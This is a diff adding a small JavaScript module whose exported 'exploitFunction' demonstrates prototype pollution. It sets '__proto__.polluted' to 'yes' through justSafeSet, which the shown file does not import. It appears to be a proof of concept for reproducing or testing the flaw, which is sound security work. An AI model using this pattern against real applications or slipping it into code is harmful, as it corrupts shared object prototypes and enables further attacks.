@@ -1,0 +1,10 @@
+function exploitFunction(payload) {
+    const { obj } = payload;
+
+    // Apply the payload
+    justSafeSet(obj, "__proto__.polluted", "yes");
+
+    return obj;
+}
+
+module.exports = { exploitFunction };
